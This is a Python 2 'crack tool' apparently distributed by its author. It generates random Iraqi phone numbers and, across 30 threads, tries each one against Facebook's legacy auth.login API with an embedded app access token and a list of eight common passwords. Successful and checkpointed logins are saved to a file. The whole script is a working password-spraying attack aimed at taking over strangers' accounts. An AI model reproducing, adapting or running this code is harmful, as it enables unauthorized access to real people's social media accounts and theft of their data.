#Code By HALO
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass


os.system("xdg-open https://www.snapchat.com/add/halo0105 ")
print("\033[91m------\033[33m shera it\033[92m ------")
CorrectUsername = "HALO"
CorrectPassword = "PASHAY"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[92mUSER: ")
    if (username == CorrectUsername):
     password = raw_input("\033[92mPASSWORD: ")
     if (password == CorrectPassword):
            print ('rasta ')
            time.sleep(3)
            os.system('python2 .py')
            loop = 'false'
     else:
         print(" Halaya !")
         os.system("clear")
    else:
        print(" Halaya !")
        os.system("clear")

os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = logo ="""

_
 _ __   __ _ ___| |__   __ _ _   _
| '_ \ / _` / __| '_ \ / _` | | | |
| |_) | (_| \__ \ | | | (_| | |_| |
| .__/ \__,_|___/_| |_|\__,_|\__, |
|_|                          |___/

====================%%%%%%=======
Crack tool HALO_PASHAY
==============================
Me Snap Chat >>> halo0105
Me Instagram >>> halo_qadr_wsw
Me Facebook  >>> HaLo Qadr Wsw
==============================
"""
back = 0
successful = []
cpb = []
oks = []
id = []
listgrup = []
vulnot = "\033[93mNot Vuln"
vuln = "\033[94mVuln"

os.system("clear")

os.system("fglet HALO")

def menu():
    os.system('clear')
    print logo
    print 42 * '\x1b[1;93m-'
    print '\x1b[1;92m[1]\x1b[1;92m CRACK NUMBER PASHAY'
    print '[2] \033[1;93mCRACK NUMBER' 
    print '[0]\x1b[1;96m  EXIT           '
    print ' '
    print 42 * '\x1b[1;94m-'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;92mCHOOSE \x1b[1;92m>>>\x1b[1;90m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        os.system("figlet CRACKED")
        print '\x1b[1;97m 750  751  770 771 '
        try:
            c = raw_input('\x1b[1;94m choose code   : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print '\x1b[1;92m 750- 751 - 752 - 770 - 771 - 772 - 780 - 781 - 782 - 783'
        try:
            c = raw_input(' choose code  : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()


    elif bch == 'F':
        os.system('clear')
        print logo
        print '\x1b[1;91m 14, 19'
        try:
            c = raw_input(' CHOOSE CODE  : ')
            k = '+80'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Hamw Raqamakan : ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;95m[\xe2\x9c\x93]\x1b[1;92m TKAYA CHAWARWAN BA HALO_PASHAY ...')
    time.sleep(0.1)
    psb('[!] Bo Wastan Dni Toolaka CTRL+z')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='

    def main(dla):
        user = dla
        try:
            os.mkdir('save')
        except OSError:
            pass

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            pass1 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Successful]' + k + c + user + ''
                print '\x1b[1;92m[ Password ]' + pass1
                print '\x1b[1;96m##\x1b[1;91mCODE\x1b[1;96m >>\x1b[1;97m+964'
                print '\x1b[1;96m##\x1b[1;91mWLAT\x1b[1;96m >>\x1b[1;97mIRAQ-KURDISTAN'
                print '\x1b[1;96m##\x1b[1;91mTIME \x1b[1;96m>>\x1b[1;97m00-1-12-24'
                print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mMATIN'
                print '\x1b[1;94m_____________________________________________'
                okb = open('anggaxd/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                cps = open('anggaxd/clone.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234554321'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[Successful]' + k + c + user + ''
                    print '\x1b[1;92m[ Password ]' + pass2
                    print '\x1b[1;96m##\x1b[1;91mCODE\x1b[1;96m >>\x1b[1;97m+964'
                    print '\x1b[1;96m##\x1b[1;91mWLAT \x1b[1;96m>>\x1b[1;97mIRAQ + KURDISTAN'
                    print '\x1b[1;96m##\x1b[1;91mTIME\x1b[1;96m >>\x1b[1;97m00-1-12-24'
                    print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                    print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>> \x1b[1;97mFACEBOOK'
                    print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                    print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mMATIN'
                    print '\x1b[1;94m_____________________________________________'
                    okb = open('anggaxd/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    cps = open('anggaxd/clone.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '1234512345'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[Successful]' + k + c + user + ''
                        print '\x1b[1;92m[ Password ]' + pass3
                        print '\x1b[1;96m##\x1b[1;91mCODE \x1b[1;96m>>\x1b[1;97m+964'
                        print '\x1b[1;96m##\x1b[1;91mWLAT \x1b[1;96m>>\x1b[1;97mIRAQ-KURDISTAN'
                        print '\x1b[1;96m##\x1b[1;91mTIME \x1b[1;96m>>\x1b[1;97m00-1-12-24'
                        print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                        print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                        print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                        print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mMATIN'
                        print '\x1b[1;94m______________________________________________'
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        cps = open('anggaxd/clone.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '112233445566'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[Successful]' + k + c + user + ''
                            print '\x1b[1;92m[ Password ]' + pass4
                            print '\x1b[1;96m##\x1b[1;91mCODE \x1b[1;96m>>\x1b[1;97m+964'
                            print '\x1b[1;96m##\x1b[1;91mWLAT \x1b[1;96m>>\x1b[1;97mIRAQ-KURDISTAN'
                            print '\x1b[1;96m##\x1b[1;91mTIME \x1b[1;96m>>\x1b[1;97m00-1-12-24'
                            print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;97m4/2021'
                            print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                            print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                            print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mMATIN'
                            print '\x1b[1;94m_____________________________________________'
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            cps = open('anggaxd/clone.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = 'hama1212'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[Successful]' + k + c + user + ''
                                print '\x1b[1;92m[ Password ]' + pass5
                                print '\x1b[1;96m##\x1b[1;91mCODE \x1b[1;96m>>\x1b[1;97m+964'
                                print '\x1b[1;96m##\x1b[1;91mWLAT \x1b[1;96m>>\x1b[1;97mIRAQ-KURDISTAN'
                                print '\x1b[1;96m##\x1b[1;91mTIME \x1b[1;96m>>\x1b[1;97m00-1-12-24'
                                print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                                print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                                print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;95mPUBG-FACEBOOK'
                                print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mMATIN'
                                print '\x1b[1;94m______________________________________________'
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                cps = open('anggaxd/clone.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = '123456789'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[Successful]' + k + c + user + ''
                                    print '\x1b[1;92m[ Password ]' + pass6
                                    print '\x1b[1;96m##\x1b[1;91mCODE\x1b[1;96m >>\x1b[1;97m+964'
                                    print '\x1b[1;96m##\x1b[1;91mWLAT\x1b[1;96m >>\x1b[1;97mIRAQ-KURDISTAN'
                                    print '\x1b[1;96m##\x1b[1;91mTIME\x1b[1;96m >>\x1b[1;97m00-1-12-24'
                                    print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                                    print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                                    print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;97mPUBG-FAEBOOK'
                                    print '\x1b[1;96m##\x1b[1;90CODER\x1b[1;96m>>\x1b[1;90mMATIN'
                                    print '\x1b[1;94m_____________________________________________'
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    cps = open('anggaxd/clone.txt', 'a')
                                    cps.write(k + c + user + pass6 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass6)
                                else:
                                    pass7 = 'hama123'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[Successful]' + k + c + user + ''
                                        print '\x1b[1;92m[ Password ]' + pass7
                                        print '\x1b[1;96m##\x1b[1;91mCODE\x1b[1;96m >>\x1b[1;97m+964'
                                        print '\x1b[1;96m##\x1b[1;91mWLAT\x1b[1;96m >>\x1b[1;97mIRAQ-KURDISTAN'
                                        print '\x1b[1;96m##\x1b[1;91mTIME\x1b[1;96m >>\x1b[1;97m00-1-12-24'
                                        print '\x1b[1;96m##\x1b[1;91mDATE \x1b[1;96m>>\x1b[1;97m4/2021'
                                        print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                                        print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;95mPUBG-FACEBOOK'
                                        print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mMATIN'
                                        print '\x1b[1;94m______________________________________________'
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        cps = open('anggaxd/clone.txt', 'a')
                                        cps.write(k + c + user + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
                                    else:
                                        pass8 = '11223344556677'
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[Successful]' + k + c + user + ''
                                            print '\x1b[1;92m[ Password ]' + pass8
                                            print '\x1b[1;96m##\x1b[1;91mCODE \x1b[1;96m>>\x1b[1;97m+964'
                                            print '\x1b[1;96m##\x1b[1;91mWLAT\x1b[1;96m >>\x1b[1;97mIRAQ-KURDISTAN'
                                            print '\x1b[1;96m##\x1b[1;91mTIME\x1b[1;96m >>\x1b[1;97m00-1-12-24'
                                            print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;97m4/2021'
                                            print '\x1b[1;96m##\x1b[1;91mLOGIN\x1b[1;96m>>\x1b[1;97mFACEBOOK'
                                            print '\x1b[1;96m##\x1b[1;91mDATE\x1b[1;96m >>\x1b[1;95mPUBG-FACEBOOK'
                                            print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mMATIN'
                                            print '\x1b[1;94m______________________________________________'
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            cps = open('anggaxd/clone.txt', 'a')
                                            cps.write(k + c + user + pass8 + '\n')
                                            cps.close()
                                            cpb.append(c + user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;97m='
    print '[\xe2\x9c\x93]\x1b[1;93m HACK TAWAW BU BAREZ ....'
    print '[\xe2\x9c\x93]\x1b[1;92m HAMU OK/\x1b[1;97mCP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;97m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()
